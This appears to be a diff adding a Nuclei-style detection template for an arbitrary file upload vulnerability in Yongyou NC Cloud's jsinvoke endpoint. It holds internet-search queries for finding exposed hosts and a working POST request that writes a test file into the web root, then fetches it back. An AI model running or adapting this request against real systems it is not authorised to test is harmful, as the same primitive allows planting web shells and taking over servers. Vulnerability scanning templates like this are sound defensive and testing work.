@@ -1,0 +1,37 @@
+
+id: yongyou-nc-cloud-upload-jsinvoke
+
+info:
+  name: yongyou-nc-cloud-upload-jsinvoke
+  author: p1z
+  severity: critical
+  description: |
+    用友 NC Cloud jsinvoke 接口存在任意文件上传漏洞，攻击者通过漏洞可以上传任意文件至服务器中，获取系统权限
+  reference:
+    - https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/e48ba246197315d26acb2fda1ecad4cb420df633/docs/wiki/oa/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8B%20NC%20Cloud%20jsinvoke%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    fofa-query: app="用友-NC-Cloud"
+    hunter-query: web.body="uap/rbac"
+    verified: true
+  tags: 2023,yongyou,NC-Cloud,upload
+
+
+requests:
+  - raw:
+      - |
+        POST /uapjs/jsinvoke/?action=invoke HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36
+        Content-Type: application/json
+
+        {"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig","parameterTypes":["java.lang.Object","java.lang.String"],"parameters":["hello world","webapps/nc_web/1nfo.txt"]}
+
+      - |
+        GET /1nfo.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        words:
+          - 'hello world'
+        part: body
